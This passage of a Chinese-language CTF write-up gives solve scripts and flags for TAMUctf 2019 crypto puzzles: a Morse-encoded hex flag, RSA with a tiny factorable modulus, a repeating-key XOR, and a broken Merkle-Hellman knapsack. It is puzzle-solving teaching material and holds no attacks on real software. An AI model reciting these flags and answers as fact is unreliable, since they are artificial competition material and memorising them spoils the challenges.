cipher="dah-dah-dah-dah-dah dah-di-di-dah di-di-di-di-dit dah-dah-di-di-dit dah-dah-di-di-dit dah-dah-dah-dah-dah di-di-dah-dah-dah di-dah dah-di-di-di-dit dah-di-dah-dit di-di-di-di-dit dah-dah-dah-di-dit dah-dah-di-di-dit di-di-di-di-dah di-di-di-di-dah dah-dah-di-di-dit di-di-di-di-dit di-dah-dah-dah-dah di-di-di-dah-dah dah-dah-dah-di-dit dah-di-di-di-dit di-di-di-di-dit di-di-di-dah-dah dah-dah-dah-di-dit dah-dah-di-di-dit di-dah-dah-dah-dah dah-di-di-di-dit dit dah-di-di-di-dit dah-di-dit di-di-di-di-dah dah-di-dit di-di-di-di-dit dah-dah-dah-dah-dit di-di-di-di-dit di-di-di-di-dit di-di-dah-dah-dah di-dah dah-dah-di-di-dit di-di-di-dah-dah dah-dah-di-di-dit dah-di-di-di-dit di-di-di-di-dah dah-di-di-di-dit di-di-di-di-dah dah-dah-dah-di-dit dah-di-di-di-dit dah-di-di-dit dah-di-di-di-dit di-dah di-di-di-di-dah dah-dah-dah-dah-dit dah-dah-di-di-dit di-di-di-di-dah di-di-dah-dah-dah di-dah di-di-di-di-dit di-di-dah-dah-dah di-di-di-di-dit di-dah-dah-dah-dah di-di-dah-dah-dah dah-di-di-di-dit di-di-di-di-dah di-dah dah-dah-di-di-dit dah-dah-dah-dah-dah di-di-di-di-dit di-dah dah-dah-di-di-dit dah-di-di-di-dit dah-di-di-di-dit di-dah dah-di-di-di-dit dah-di-dit di-di-dah-dah-dah di-dah-dah-dah-dah di-di-dah-dah-dah di-di-di-di-dit di-di-dah-dah-dah di-di-di-di-dit di-di-di-di-dah dah-di-di-dit di-di-di-di-dah di-di-di-di-dah dah-di-di-di-dit dah-di-di-dit dah-di-di-di-dit dah-di-di-di-dit dah-dah-di-di-dit dah-dah-dah-dah-dah di-di-dah-dah-dah di-di-di-dah-dah di-di-di-di-dit dit di-di-di-di-dah dit di-di-di-dah-dah dah-dah-dah-dah-dit dah-di-di-di-dit dah-di-di-di-dit dah-di-di-di-dit dah-di-di-dit di-di-di-dah-dah di-di-di-di-dah dah-di-di-di-dit di-di-di-di-dah di-di-di-di-dit di-di-di-di-dit di-di-di-dah-dah di-di-di-di-dah dah-di-di-di-dit dah-di-dah-dit di-di-di-di-dah di-di-dah-dah-dah di-di-di-dah-dah di-di-di-dah-dah dah-dah-di-di-dit di-di-dah-dah-dah di-di-di-di-dit di-di-di-di-dah dah-di-di-di-dit di-di-dah-dit di-di-di-di-dit di-di-di-di-dah di-di-di-dah-dah dah-dah-dah-dah-dah di-di-di-di-dit dah-dah-dah-dah-dah di-di-di-di-dit di-dah di-di-di-di-dit di-dah-dah-dah-dah dah-di-di-di-dit dah-di-dit di-di-di-di-dah di-di-di-dah-dah di-di-di-di-dit di-dah-dah-dah-dah di-di-di-di-dah di-di-di-di-dit di-di-di-di-dah dah-di-di-dit di-di-di-di-dit dah-dah-dah-dah-dit di-di-di-di-dah di-di-dah-dah-dah di-di-di-dah-dah di-di-di-di-dah di-di-di-di-dit di-dah di-di-di-di-dah dah-di-dit dah-dah-di-di-dit dah-di-di-di-dit di-di-dah-dah-dah di-dah di-di-dah-dah-dah di-dah-dah-dah-dah di-di-di-di-dah dah-di-di-di-dit dah-di-di-di-dit dah-di-di-dit di-di-di-dah-dah dah-dah-dah-di-dit dah-di-di-di-dit dah-di-dah-dit di-di-dah-dah-dah di-di-di-di-dit dah-di-di-di-dit di-di-dah-dah-dah dah-di-di-di-dit di-dah dah-dah-di-di-dit di-dah-dah-dah-dah dah-di-di-di-dit dah-di-dah-dit di-di-di-di-dit dah-dah-dah-dah-dah di-di-di-di-dah dah-di-dit dah-di-di-di-dit dah-di-di-di-dit di-di-di-di-dah dah-dah-dah-dah-dit di-di-di-di-dah dah-dah-di-di-dit dah-di-di-di-dit dah-di-dit dah-di-di-di-dit di-dah-dah-dah-dah di-di-dah-dah-dah di-di-di-di-dit di-di-dah-dah-dah di-di-di-di-dit di-di-di-di-dah dah-di-di-di-dit dah-dah-di-di-dit di-dah di-di-di-di-dah dah-dah-di-di-dit di-di-dah-dah-dah dah-dah-dah-dah-dah dah-di-di-di-dit dah-dah-di-di-dit dah-di-di-di-dit dah-dah-dah-dah-dit dah-di-di-di-dit dah-dah-di-di-dit dah-di-di-di-dit di-di-di-di-dit dah-di-di-di-dit dah-di-dit dah-dah-di-di-dit dah-di-di-dit di-di-di-di-dah di-di-di-dah-dah di-di-di-dah-dah di-dah-dah-dah-dah dah-di-di-di-dit dah-dah-dah-dah-dit dah-di-di-di-dit di-di-di-dah-dah di-di-di-di-dah dah-di-di-dit di-di-di-di-dit di-di-dah-dit dah-di-di-di-dit di-di-di-dah-dah dah-di-di-di-dit dah-di-dah-dit di-di-di-dah-dah di-dah-dah-dah-dah di-di-di-di-dah di-di-di-dah-dah di-di-di-di-dah dah-di-di-dit di-di-dah-dah-dah dah-di-dit dah-dah-di-di-dit dah-dah-dah-dah-dit di-di-di-dah-dah dah-dah-dah-dah-dah dah-dah-di-di-dit di-di-di-di-dit di-di-di-di-dit di-di-dah-dit dah-di-di-di-dit dah-dah-dah-di-dit di-di-di-dah-dah di-di-di-di-dah dah-dah-di-di-dit dah-di-di-di-dit di-di-di-dah-dah di-di-di-dah-dah di-di-di-di-dit di-di-dah-dit dah-di-di-di-dit dah-di-dit di-di-di-dah-dah di-di-di-di-dah di-di-di-di-dah dah-dah-dah-dah-dit di-di-di-dah-dah di-dah-dah-dah-dah dah-dah-di-di-dit dah-di-dit di-di-dah-dah-dah dah-dah-dah-dah-dah dah-dah-di-di-dit di-di-di-di-dit dah-dah-di-di-dit dah-di-di-di-dit di-di-di-dah-dah di-di-di-di-dah dah-dah-di-di-dit dah-di-di-di-dit dah-dah-di-di-dit di-dah di-di-di-di-dah dah-di-di-dit di-di-di-di-dit di-dah dah-dah-di-di-dit di-di-di-di-dah di-di-di-dah-dah di-di-di-di-dah dah-dah-di-di-dit dah-dah-dah-dah-dit dah-di-di-di-dit di-di-dah-dit dah-di-di-di-dit dah-di-dit dah-di-di-di-dit dah-dah-dah-dah-dit di-di-di-di-dah di-di-di-di-dah di-di-di-di-dit di-di-di-dah-dah dah-di-di-di-dit dah-dah-dah-di-dit di-di-di-di-dah dah-di-dah-dit dah-di-di-di-dit dah-di-dit di-di-di-dah-dah dah-dah-dah-di-dit di-di-di-di-dit di-dah-dah-dah-dah di-di-di-di-dah di-di-di-di-dit di-di-di-di-dah dah-di-di-di-dit dah-di-di-di-dit dit di-di-di-di-dit di-di-di-di-dit dah-dah-di-di-dit di-di-di-di-dah dah-dah-di-di-dit dah-dah-di-di-dit di-di-di-di-dah di-dah di-di-di-di-dah dah-dah-dah-dah-dah di-di-di-di-dah dit dah-dah-di-di-dit di-di-di-di-dit di-di-di-di-dah di-di-dah-dit di-di-di-di-dit dah-dah-dah-dah-dit dah-di-di-di-dit dah-di-di-di-dit di-di-di-di-dit dah-dah-dah-di-dit di-di-dah-dah-dah dah-di-di-di-dit di-di-di-dah-dah dah-dah-dah-di-dit dah-dah-di-di-dit di-di-di-di-dit di-di-di-di-dah dah-dah-dah-dah-dah di-di-di-di-dah dah-dah-di-di-dit dah-di-di-di-dit dit di-di-dah-dah-dah di-dah-dah-dah-dah di-di-di-dah-dah di-dah-dah-dah-dah di-di-dah-dah-dah di-di-di-di-dit di-di-di-di-dit di-di-di-di-dah dah-dah-di-di-dit di-dah-dah-dah-dah dah-dah-di-di-dit dah-di-di-di-dit di-di-di-dah-dah dah-dah-dah-dah-dah di-di-di-di-dit dah-di-di-di-dit dah-di-di-di-dit di-di-di-dah-dah di-di-di-di-dit di-di-dah-dah-dah dah-dah-di-di-dit di-dah di-di-di-di-dit dah-di-di-di-dit di-di-dah-dah-dah di-dah-dah-dah-dah dah-di-di-di-dit di-dah di-di-dah-dah-dah di-dah-dah-dah-dah dah-dah-di-di-dit dah-di-di-di-dit dah-dah-di-di-dit di-di-di-di-dit dah-dah-di-di-dit di-di-di-di-dit dah-dah-di-di-dit dah-dah-dah-dah-dah di-di-di-dah-dah dah-dah-dah-di-dit di-di-di-di-dah di-di-dah-dah-dah dah-di-di-di-dit di-dah dah-di-di-di-dit di-di-di-di-dah di-di-di-di-dah dit di-di-di-di-dah dah-dah-dah-dah-dit dah-dah-di-di-dit di-dah-dah-dah-dah di-di-di-di-dah di-di-di-di-dit di-di-di-dah-dah di-di-di-di-dit dah-dah-di-di-dit dah-dah-di-di-dit di-di-dah-dah-dah di-di-di-dah-dah di-di-dah-dah-dah di-di-di-di-dah di-di-dah-dah-dah di-di-di-di-dit di-di-di-di-dit dah-di-di-di-dit di-di-di-dah-dah di-di-di-di-dah di-di-di-di-dit di-di-di-di-dit di-di-di-di-dit di-dah di-di-di-di-dah di-di-dah-dit di-di-di-di-dit dah-dah-dah-dah-dit di-di-di-di-dit di-dah di-di-di-dah-dah di-di-dah-dah-dah dah-dah-di-di-dit di-dah di-di-di-dah-dah dah-dah-di-di-dit di-di-di-di-dit di-di-di-di-dah di-di-di-dah-dah di-di-dah-dah-dah di-di-di-dah-dah di-di-di-di-dit dah-dah-di-di-dit di-di-di-di-dah di-di-di-dah-dah dah-dah-di-di-dit di-di-dah-dah-dah dah-di-di-di-dit dah-dah-di-di-dit dah-dah-dah-di-dit di-di-di-di-dah dah-di-dah-dit di-di-di-di-dah dah-dah-dah-dah-dah di-di-di-di-dit dah-dah-di-di-dit di-di-di-di-dah di-di-dah-dit di-di-di-dah-dah dah-dah-di-di-dit di-di-di-dah-dah di-di-di-di-dah di-di-di-dah-dah di-dah-dah-dah-dah di-di-di-dah-dah dah-dah-dah-dah-dah di-di-di-di-dit di-dah-dah-dah-dah di-di-di-di-dah dah-dah-dah-dah-dit"
cipher=cipher.replace('-','').replace('dit','.').replace('di','.').replace('dah','-')
print morse(cipher)
# 0x57702a6c58744751386538716e6d4d59552a737646486b6a49742a5251264a705a766a6d2125254b446b6670235e4e39666b346455346c423372546f5430505a516d4351454b5942345a4d762a21466b386c25626a716c504d6649476d612525467a4720676967656d7b433169634b5f636c31434b2d7930755f683476335f6d3449317d20757634767a4b5a7434796f6d694453684c6d385145466e5574774a404e754f59665826387540476e213125547176305663527a56216a217675757038426a644e49714535772324255634555a4f595a327a37543235743726784c40574f373431305149
# use https://findneo.github.io/kt/tools.html#conv/ to convert hex to string
# gigem{C1icK_cl1CK-y0u_h4v3_m4I1} 
```

## RSAaaay

> Hey, you're a hacker, right? I think I am too, look at what I made!
>
> ------
>
> ```
> (2531257, 43)
> ```
>
> My super secret message: `906851 991083 1780304 2380434 438490 356019 921472 822283 817856 556932 2102538 2501908 2211404 991083 1562919 38268`
>
> ------
>
> Problem is, I don't remember how to decrypt it... could you help me out?
>
> Difficulty: easy

solve.py

```python
import gmpy2
n=2531257
e=43
cc=[906851 ,991083 ,1780304 ,2380434 ,438490 ,356019 ,921472 ,822283 ,817856, 556932 ,2102538 ,2501908, 2211404 ,991083 ,1562919 ,38268]

p,q=509,4973
assert(p*q==n)
phi=(p-1)*(q-1)
d=gmpy2.invert(e,phi)
assert(e*d%phi==1)
mm=''.join([str(int(pow(c,d,n))) for c in cc])
print mm #103105103101109123839711897103101958310512095701081211051101039584105103101114115125

mm=[103,105,103,101,109,123,83,97,118,97,103,101,95,83,105,120,95,70,108,121,105,110,103,95,84,105,103,101,114,115,125]
print ''.join([chr(m) for m in mm])
# gigem{Savage_Six_Flying_Tigers}
```

## :)

> Look at what I found! `XUBdTFdScw5XCVRGTglJXEpMSFpOQE5AVVxJBRpLT10aYBpIVwlbCVZATl1WTBpaTkBOQFVcSQdH`
>
> Difficulty: easy

直接base64解码没有可打印字符。已知flag前几个字符为gigem{，尝试base64解码后内容和gigem逐字节异或得到`:):):` ，发现规律。

solve.py

```python
import base64,itertools
data=base64.b64decode("XUBdTFdScw5XCVRGTglJXEpMSFpOQE5AVVxJBRpLT10aYBpIVwlbCVZATl1WTBpaTkBOQFVcSQdH")
flag_format="gigem{"
print ''.join(chr(ord(a)^ord(b))for a,b in zip(flag_format,data))
# :):):)
print(''.join(chr(ord(a)^ord(b)) for a,b in zip(data, itertools.cycle(':)'))))
# gigem{I'm not superstitious, but I am a little stitious.}
```

zip和itertools.cycle用法如下

```python
zip(seq1 [, seq2 [...]]) -> [(seq1[0], seq2[0] ...), (...)]
param seq1

Return a list of tuples, where each tuple contains the i-th element
from each of the argument sequences.  The returned list is truncated
in length to the length of the shortest argument sequence.

-------

cycle(iterable) --> cycle object
param iterable

Return elements from the iterable until it is exhausted.
Then repeat the sequence indefinitely.
```

另外有一个不错的工具（<https://gchq.github.io/CyberChef/#recipe=Magic(3,true,false,'')&input=WFVCZFRGZFNjdzVYQ1ZSR1RnbEpYRXBNU0ZwT1FFNUFWVnhKQlJwTFQxMGFZQnBJVndsYkNWWkFUbDFXVEJwYVRrQk9RRlZjU1FkSA>） 可以尝试检查数据可能的格式。

## Holey Knapsack

> My knapsack has a hole in it
>
> Cipher text: `11b90d6311b90ff90ce610c4123b10c40ce60dfa123610610ce60d450d000ce61061106110c4098515340d4512361534098509270e5d09850e58123610c9`
>
> Public key: `{99, 1235, 865, 990, 5, 1443, 895, 1477}`
>
> The flag is slightly off format.
>
> Difficulty: medium

是著名的和RSA同年发布的公钥加密系统 [Merkle-Hellman Public Key Cryptosystem](https://en.wikipedia.org/wiki/Merkle%E2%80%93Hellman_knapsack_cryptosystem)  ，是[Knapsack cryptosystems](https://en.wikipedia.org/wiki/Knapsack_cryptosystems) 之一，已被破解。 参见https://www.nevivur.net/writeups/2019/02/tamuctf-19/#holey-knapsack 。

[解密脚本](https://www.nevivur.net/writeups/2019/02/tamuctf-19/holey-knapsack/solution.py)：

```python
#!/usr/bin/env python3

pkey = [99, 1235, 865, 990, 5, 1443, 895, 1477]
ctext = '11b90d6311b90ff90ce610c4123b10c40ce60dfa123610610ce60d450d000ce61061106110c4098515340d4512361534098509270e5d09850e58123610c9'

mapping = dict()
for c in range(256):
    enc = 0
    for i in range(8):
        if c&(1<<i):
            enc += pkey[i]
    mapping[hex(enc)[2:]] = chr(c)

d = ''
while ctext:
    if not d and ctext[0] == '0':
        ctext = ctext[1:]
    d += ctext[0]
    ctext = ctext[1:]

    if d in mapping:
        print mapping[d],
        d = ''

# g i g _ e m { m e r k l e - h e l l m a n - k n a p s a c k } 
```

# 参考链接

- https://ctftime.org/event/740/tasks/ 